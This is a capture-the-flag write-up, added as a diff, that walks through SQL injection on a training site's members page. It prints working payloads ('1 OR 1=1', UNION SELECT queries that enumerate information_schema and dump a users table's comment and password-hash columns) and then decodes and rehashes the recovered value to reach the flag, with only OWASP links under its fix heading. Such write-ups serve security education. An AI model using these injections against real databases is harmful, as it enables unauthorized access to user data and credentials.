@@ -1,0 +1,35 @@
+First, try the most basic SQL Injection there is:
+    1 OR 1=1
+And immediately you get the results that shows it works. Meaning that the server
+uses straight SQL quiries in it's code and at the end has WHERE id=<user_input>
+
+Among the info from our first query there is a clue:
+    First name: Flag
+    Surname : GetThe
+
+After trying different SELECTs with wildecard (*) and different number
+of parameters you find that the hack only works with 2.
+
+Now, since we're at the members page we need to find a table for members/users/accounts/profiles
+and columns for it:
+    1 OR 1=1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
+At the end you find 'users' table with the following columns:
+    user_id
+    first_name
+    last_name
+    town
+    country
+    planet
+    Commentaire
+    countersign
+
+The ones you're looking for are 'Commentaire' and 'countersign':
+    1 UNION SELECT Commentaire, countersign FROM users
+By following the discovered instructions you get the flag.
+    `md5 decode` gets you "FortyTwo" which you convert to lowercase
+    `echo -n "fortytwo" | shasum -a 256` gets you the flag
+
+FIX
+
+https://owasp.org/www-community/attacks/SQL_Injection
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
